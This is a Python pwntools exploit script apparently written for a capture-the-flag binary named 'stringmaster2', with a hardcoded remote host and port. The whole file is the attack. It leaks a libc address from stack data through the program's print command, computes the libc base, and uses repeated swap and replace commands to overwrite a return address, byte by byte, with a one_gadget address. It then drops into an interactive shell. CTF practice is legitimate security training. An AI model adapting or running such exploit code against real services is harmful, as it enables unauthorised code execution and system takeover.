from pwn import *
import argparse
import os
import string

#context.log_level = "debug"
LOCAL_PATH = "./stringmaster2"

def get_process(is_remote = False):
    if is_remote:
        return remote("35.207.132.47", 22225)
    else:
        return process(LOCAL_PATH)

def get_libc_path(is_remote = False):
    if is_remote:
        return "./libc-2.27.so"
    else:
        return "/lib/x86_64-linux-gnu/libc.so.6"

def get_one_gadget(is_remote = False):
    if is_remote: 
        return 0x4f2c5
    else:
       # return 0x4345e
        return 0x4f2c5 

def read_menu(proc):
    proc.recvuntil("\n> ")

def swap(proc, index1, index2):
    read_menu(proc)
    proc.sendline("swap")
    proc.sendline("{} {}".format(index1, index2))
    log.info("Swapping index {} and {}".format(index1, index2))

def replace(proc, char1, char2):
    read_menu(proc)
    proc.sendline("replace")
    proc.sendline("{} {}".format(char1, char2))
    log.info("Replacing '{}' and '{}'".format(char1, char2))

def print_info(proc):
    read_menu(proc)
    proc.sendline("print")
    return proc.recvuntil("\nEnter the command you want to execute:", drop = True)

def quit(proc):
    read_menu(proc)
    proc.sendline("quit")
    log.info("Quitting...")

parser = argparse.ArgumentParser()
parser.add_argument("-r", "--remote", help="Execute on remote server", action="store_true")
args = parser.parse_args()

e = ELF(LOCAL_PATH)
libc = ELF(get_libc_path(args.remote))


p = get_process(args.remote)
p.recvuntil("String1: ")
str1 = p.recvline()
p.recvuntil("String2: ")
str2 = p.recvline()

log.info("String 1: {}".format(str1))
log.info("String 2: {}".format(str2))
for x in string.ascii_lowercase:
    if x not in str1:
        missing_letter = x
        break
replace(p, x, x)

print "Before modification:"
stack = print_info(p)
print hexdump(stack)

base_index = 0x78
libc_start_main_base_index = 0x88

libc_start_main = u64(stack[libc_start_main_base_index:libc_start_main_base_index+8]) - 231
libc_base =  libc_start_main - libc.symbols["__libc_start_main"]
assert(libc_base & 0xFFF == 0)
log.info("libc_base: {}".format(hex(libc_base)))

libc.address = libc_base

one_gadget = libc_base + get_one_gadget(args.remote)
log.info("one_gadget address: {}".format(hex(one_gadget)))

for i, char in enumerate(p64(one_gadget)):
    replace(p, str1[0], char)
    swap(p, 0, base_index + i)
    str1 = print_info(p)[:len(str1)]

print "After modification:"
print hexdump(print_info(p))
quit(p)
p.interactive()

